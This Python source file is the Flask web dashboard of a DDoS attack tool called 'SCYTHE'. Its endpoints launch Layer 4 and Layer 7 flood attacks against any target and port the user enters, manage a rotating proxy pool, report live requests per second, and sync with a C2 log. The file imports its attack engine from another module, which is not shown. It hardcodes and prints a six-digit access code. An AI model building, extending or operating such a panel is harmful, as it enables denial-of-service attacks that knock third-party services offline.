#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SCYTHE WEB DASHBOARD v11.0 — FULL SYNC + CUSTOM TEMPLATE
🔥 6 L7 + 4 L4 METHODS
🔥 ATTACK FROM DASHBOARD ↔ C2 ↔ STATE FULL SYNC
🔥 LIVE RPS REAL-TIME
🔥 Uses existing dashboard.html template
Built for: Alpha @scytheinhere88
"""
import os
import sys
import time
import json
import re
import subprocess
import threading
import queue
import hashlib
import secrets
from datetime import datetime
from functools import wraps
from flask import Flask, render_template, jsonify, request, Response, session, redirect, url_for
from flask_cors import CORS

# ─── IMPORT STATE MANAGER ───
try:
    from state_manager import state, MAX_CONCURRENT, MAX_HOLD_TIME
except ImportError as e:
    print("[FATAL] state_manager.py not found. Run setup.sh first.")
    sys.exit(1)

# ─── IMPORT ATTACK EXECUTOR ───
try:
    from attack_executor import AttackExecutor, METHODS, get_vps_specs, calculate_rps_estimate, get_adaptive_threads
except ImportError as e:
    print("[FATAL] attack_executor.py not found. Run setup.sh first.")
    sys.exit(1)

# ─── FLASK APP ───
app = Flask(__name__, template_folder='templates', static_folder='static')
app.secret_key = secrets.token_hex(32)
CORS(app)
app.config['JSON_SORT_KEYS'] = False

AUTH_CODE = "665544"
SESSION_TIMEOUT = 3600

executor = AttackExecutor()
executor.start_proxy_refresh()

DASHBOARD_LOG = "dashboard_session.log"
C2_LOG = "c2_session.log"

def log_dashboard(message, level="INFO"):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(DASHBOARD_LOG, 'a') as f:
            f.write(f"[{timestamp}] [{level}] {message}\n")
    except:
        pass

# ─── AUTH DECORATOR ───
def require_auth(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('authenticated'):
            if request.path.startswith('/api/'):
                auth_token = request.headers.get('X-Auth-Token')
                if auth_token and auth_token == AUTH_CODE:
                    return f(*args, **kwargs)
                return jsonify({'error': 'Authentication required', 'code': 'AUTH_REQUIRED'}), 401
            return redirect(url_for('login_page'))
        return f(*args, **kwargs)
    return decorated_function

# ─── LOGIN ───
@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        code = request.form.get('code', '').strip()
        if code == AUTH_CODE:
            session['authenticated'] = True
            session['login_time'] = time.time()
            log_dashboard(f"Login successful from {request.remote_addr}", "AUTH")
            return redirect(url_for('index'))
        else:
            log_dashboard(f"Login failed from {request.remote_addr}", "AUTH")
            return render_template('login.html', error='Invalid authentication code')
    if session.get('authenticated'):
        login_time = session.get('login_time', 0)
        if time.time() - login_time < SESSION_TIMEOUT:
            return redirect(url_for('index'))
        else:
            session.pop('authenticated', None)
            session.pop('login_time', None)
    return render_template('login.html', error=None)

@app.route('/logout')
def logout():
    session.pop('authenticated', None)
    session.pop('login_time', None)
    log_dashboard(f"Logout from {request.remote_addr}", "AUTH")
    return redirect(url_for('login_page'))

@app.route('/')
@require_auth
def index():
    log_dashboard(f"Dashboard accessed from {request.remote_addr}", "ACCESS")
    return render_template('dashboard.html')

# ─── API ENDPOINTS ───

@app.route('/api/status')
@require_auth
def api_status():
    """Get full system status including active attacks"""
    data = state.get_state()
    proxy_count = executor.get_proxy_count()
    data['proxy_pool'] = proxy_count
    data['proxy_total_fetched'] = proxy_count
    data['proxy_refreshing'] = executor.proxy_running
    data['authenticated'] = True
    # Add threads info to each attack
    for attack in data.get('active_attacks', []):
        if 'threads' not in attack:
            attack['threads'] = get_adaptive_threads(attack.get('method', 'httpbypass'), attack.get('duration', 60))
    return jsonify(data)

@app.route('/api/stream')
@require_auth
def api_stream():
    """Server-Sent Events for real-time updates"""
    def generate():
        while True:
            try:
                data = state.get_state()
                proxy_count = executor.get_proxy_count()
                data['proxy_pool'] = proxy_count
                data['proxy_total_fetched'] = proxy_count
                data['proxy_refreshing'] = executor.proxy_running
                data['authenticated'] = True
                for attack in data.get('active_attacks', []):
                    if 'threads' not in attack:
                        attack['threads'] = get_adaptive_threads(attack.get('method', 'httpbypass'), attack.get('duration', 60))
                yield f"data: {json.dumps(data)}\n\n"
                time.sleep(1)
            except GeneratorExit:
                break
            except Exception as e:
                yield f"data: {json.dumps({'error': str(e)})}\n\n"
                time.sleep(2)
    return Response(generate(), mimetype='text/event-stream', headers={
        'Cache-Control': 'no-cache',
        'X-Accel-Buffering': 'no',
        'Connection': 'keep-alive'
    })

@app.route('/api/attack', methods=['POST'])
@require_auth
def api_attack():
    """Launch attack from dashboard"""
    try:
        data = request.get_json() or {}
        method = data.get('method', '').strip().lower()
        target = data.get('target', '').strip()
        port = str(data.get('port', '80')).strip()
        duration = data.get('duration', '60')
        hold_time = data.get('hold_time')
        
        # Validate
        if not method or not target or not port or not duration:
            return jsonify({'success': False, 'error': 'Missing required fields'}), 400
        if method not in METHODS:
            return jsonify({'success': False, 'error': f'Unknown method: {method}'}), 400
        if METHODS[method]["layer"] == 7 and not target.startswith("http"):
            target = "https://" + target
        
        # Get threads estimate for display
        threads = get_adaptive_threads(method, int(duration))
        
        # Execute attack
        success = executor.execute(method, target, port, duration, hold_time)
        
        if success:
            state._reload()
            active = state.state.get("active_attacks", [])
            attack_id = active[-1]["id"] if active else "unknown"
            # Update threads in state
            for attack in active:
                if attack["id"] == attack_id:
                    attack["threads"] = threads
                    break
            state._save()
            log_dashboard(f"Attack launched: {method} -> {target}:{port} | Threads: {threads}", "ATTACK")
            return jsonify({
                'success': True,
                'attack_id': attack_id,
                'threads': threads,
                'message': f'Attack launched: {method} -> {target}:{port}'
            })
        else:
            return jsonify({'success': False, 'error': 'Failed to launch attack (check logs)'}), 500
    except Exception as e:
        log_dashboard(f"Attack error: {str(e)}", "ERROR")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/stop/<attack_id>', methods=['POST'])
@require_auth
def api_stop(attack_id):
    """Stop specific attack"""
    try:
        success = executor.stop_attack(attack_id)
        if success:
            log_dashboard(f"Attack stopped: {attack_id}", "STOP")
            return jsonify({'success': True, 'message': 'Attack stopped'})
        else:
            return jsonify({'success': False, 'error': 'Attack not found'}), 404
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/stopall', methods=['POST'])
@require_auth
def api_stopall():
    """Stop all attacks"""
    try:
        executor.stop_all()
        log_dashboard("All attacks stopped", "STOP")
        return jsonify({'success': True, 'message': 'All attacks stopped'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/proxy/refresh', methods=['POST'])
@require_auth
def api_proxy_refresh():
    """Manually refresh proxy pool"""
    try:
        subprocess.run(["python3", "getproxy.py"], capture_output=True, timeout=30)
        count = executor.get_proxy_count()
        log_dashboard(f"Proxy refresh: {count} proxies", "PROXY")
        return jsonify({'success': True, 'proxy_count': count})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/methods')
@require_auth
def api_methods():
    """List all available methods"""
    methods_list = []
    for name, info in METHODS.items():
        methods_list.append({
            'name': name,
            'layer': info['layer'],
            'type': info['type'],
            'desc': info['desc'],
            'target': info['target'],
            'adaptive_threads': get_adaptive_threads(name, 60)
        })
    return jsonify({'methods': methods_list})

@app.route('/api/vps')
@require_auth
def api_vps():
    """Get VPS specs and RPS estimates"""
    cpu, ram, disk = get_vps_specs()
    proxy_count = executor.get_proxy_count()
    l7_rps, l4_rps = calculate_rps_estimate(proxy_count, max(len(state.state["active_attacks"]), 1))
    thread_estimates = {}
    for method in list(METHODS.keys())[:10]:
        thread_estimates[method] = get_adaptive_threads(method, 60)
    return jsonify({
        'cpu_cores': cpu,
        'ram_gb': round(ram, 1),
        'disk_gb': round(disk, 1),
        'proxy_count': proxy_count,
        'est_l7_rps': l7_rps,
        'est_l4_rps': l4_rps,
        'max_concurrent': MAX_CONCURRENT,
        'adaptive_threads': thread_estimates
    })

@app.route('/api/auth/status')
def auth_status():
    if session.get('authenticated'):
        login_time = session.get('login_time', 0)
        if time.time() - login_time < SESSION_TIMEOUT:
            return jsonify({'authenticated': True})
    return jsonify({'authenticated': False})

@app.route('/api/auth/login', methods=['POST'])
def auth_login():
    try:
        data = request.get_json() or {}
        code = data.get('code', '').strip()
        if code == AUTH_CODE:
            session['authenticated'] = True
            session['login_time'] = time.time()
            log_dashboard(f"API login successful from {request.remote_addr}", "AUTH")
            return jsonify({'success': True, 'message': 'Authenticated'})
        else:
            log_dashboard(f"API login failed from {request.remote_addr}", "AUTH")
            return jsonify({'success': False, 'error': 'Invalid code'}), 401
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/auth/logout', methods=['POST'])
def auth_logout():
    session.pop('authenticated', None)
    session.pop('login_time', None)
    log_dashboard(f"API logout from {request.remote_addr}", "AUTH")
    return jsonify({'success': True, 'message': 'Logged out'})

@app.route('/api/logs')
@require_auth
def api_logs():
    """Get combined logs from C2 and Dashboard"""
    try:
        lines = []
        if os.path.exists(C2_LOG):
            with open(C2_LOG, 'r') as f:
                c2_lines = f.readlines()[-30:]
                lines.extend([("[C2] " + l) for l in c2_lines])
        if os.path.exists(DASHBOARD_LOG):
            with open(DASHBOARD_LOG, 'r') as f:
                dash_lines = f.readlines()[-30:]
                lines.extend([("[DASH] " + l) for l in dash_lines])
        lines = lines[-50:]
        return jsonify({'logs': lines})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ─── BACKGROUND SYNC ───
def sync_worker():
    while True:
        try:
            state._reload()
            proxy_count = executor.get_proxy_count()
            state.state['proxy_pool'] = proxy_count
            state.state['proxy_total_fetched'] = proxy_count
            state.state['proxy_refreshing'] = executor.proxy_running
            
            # Recalculate totals from active attacks
            active = state.state.get('active_attacks', [])
            total_rps = sum(a.get('rps', 0) for a in active)
            total_requests = sum(a.get('total_requests', 0) for a in active)
            total_bytes = sum(a.get('total_bytes', 0) for a in active)
            
            state.state['total_rps'] = total_rps
            state.state['total_requests'] = total_requests
            state.state['total_bytes'] = total_bytes
            state.state['system_status'] = 'online'
            state.state['last_updated'] = time.time()
            state._save()
        except Exception as e:
            print(f"[SYNC ERROR] {e}")
        time.sleep(1)

sync_thread = threading.Thread(target=sync_worker, daemon=True)
sync_thread.start()

# ─── MAIN ───
if __name__ == '__main__':
    host = os.environ.get('DASHBOARD_HOST', '0.0.0.0')
    port = int(os.environ.get('DASHBOARD_PORT', 1837))
    print("╔═══════════════════════════════════════════════════════════════════════════════╗")
    print("║  SCYTHE Web Dashboard v11.0 — FULL SYNC + CUSTOM TEMPLATE                    ║")
    print("║  🔥 Authentication: Code 665544 required                                     ║")
    print("║  🔥 6 L7 + 4 L4 Methods                                                      ║")
    print("║  🔥 Live RPS Real-time                                                       ║")
    print("║  🔥 Sync: C2 ↔ Dashboard ↔ State                                            ║")
    print("║  🔥 Uses custom dashboard.html template                                      ║")
    print("╚═══════════════════════════════════════════════════════════════════════════════╝")
    print(f"")
    print(f"[INFO] Starting dashboard on http://{host}:{port}")
    print(f"[INFO] Authentication Code: 665544")
    print(f"[INFO] Methods: {len(METHODS)} (6 L7 + 4 L4)")
    print(f"[INFO] Press Ctrl+C to stop")
    print(f"")
    app.run(host=host, port=port, threaded=True, debug=False)